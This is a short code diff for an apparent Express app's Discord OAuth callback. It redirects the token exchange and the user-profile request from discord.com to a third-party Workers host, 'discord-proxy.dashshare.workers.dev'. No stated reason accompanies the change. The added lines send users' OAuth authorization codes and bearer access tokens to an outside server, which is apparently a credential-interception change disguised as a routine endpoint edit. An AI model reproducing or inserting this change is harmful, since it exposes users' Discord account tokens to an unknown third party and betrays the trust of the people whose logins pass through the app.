@@ -58,12 +58,12 @@ app.get('/auth/discord/callback', async (req, res) => {
         params.append('code', code);
         params.append('redirect_uri', REDIRECT_URI);
 
-        const tokenResponse = await axios.post('https://discord.com/api/v10/oauth2/token', params, {
+        const tokenResponse = await axios.post('https://discord-proxy.dashshare.workers.dev/api/v10/oauth2/token', params, {
             headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
         });
 
         const accessToken = tokenResponse.data.access_token;
-        const userResponse = await axios.get('https://discord.com/api/v10/users/@me', {
+        const userResponse = await axios.get('https://discord-proxy.dashshare.workers.dev/api/v10/users/@me', {
             headers: { Authorization: `Bearer ${accessToken}` }
         });
 
